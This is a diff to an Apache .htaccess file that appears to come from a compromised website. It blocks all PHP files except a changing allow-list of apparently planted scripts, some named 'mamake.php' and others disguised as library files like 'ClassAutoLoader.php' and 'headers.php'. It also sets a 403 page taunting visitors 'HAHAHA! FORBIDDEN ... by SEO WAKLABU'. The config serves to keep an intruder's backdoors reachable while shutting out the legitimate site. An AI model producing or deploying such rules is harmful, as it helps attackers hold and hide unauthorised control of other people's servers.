@@ -1,4 +1,3 @@
-
 <Files *.ph*>
     Order Deny,Allow
     Deny from all
@@ -59,9 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(wakwaw.php|wakwaw-OTH.php)$">
+<FilesMatch "^(mamake-OTH.php|Submissions.php|mamake.php|Partitioned.php|ClassAutoLoader.php|CommonLexer.php|InflectorCache.php|headers.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
-ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/WFV2-uyVM_0AAAAd/lloyd-frontera-lloyd.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by WAKLABU</h2>
+ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/WFV2-uyVM_0AAAAd/lloyd-frontera-lloyd.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by SEO WAKLABU</h2>
